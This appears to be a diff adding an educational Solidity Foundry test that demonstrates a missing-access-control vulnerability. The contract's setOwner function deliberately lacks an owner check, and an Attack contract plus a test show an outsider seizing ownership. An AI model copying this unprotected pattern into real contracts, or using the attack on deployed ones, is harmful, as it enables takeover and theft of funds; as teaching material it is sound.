@@ -1,0 +1,58 @@
+// SPDX-License-Identifier: MIT
+/*
+Missing access controls attack vector refers to the absence of restrictions 
+that allow unauthorized users to access or modify sensitive functions and data within a system, 
+leading to potential exploitation and unauthorized actions.
+*/
+pragma solidity 0.8.20;
+
+import "forge-std/Test.sol";
+
+contract MissingAccessControls {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    //This should only be callable by the current owner
+     
+     
+    function setOwner(address newOwner) external {
+        // This is missing a check on whether the caller is the current owner!!
+        owner = newOwner;
+    }
+}
+
+contract Attack {
+    MissingAccessControls public target;
+
+    constructor(MissingAccessControls _target) {
+        target = _target;
+    }
+
+    function attack() external {
+        target.setOwner(address(this)); // Change the owner to the attack contract
+    }
+}
+
+contract MissingAccessControlsVulnerabilityTest is Test {
+    MissingAccessControls public target;
+    Attack public attacker;
+
+    function setUp() public {
+        target = new MissingAccessControls();
+        attacker = new Attack(target);
+    }
+
+    function testChangeOwnerWithoutPermission() public {
+        // Initially, the owner is the deployer of the MissingAccessControls contract
+        address initialOwner = address(target.owner());
+        
+        // Call the attack function to attempt changing the owner
+        attacker.attack();
+
+        // Check if the owner has been changed to the attacker's contract address
+        assertEq(address(target.owner()), address(attacker));
+    }
+}
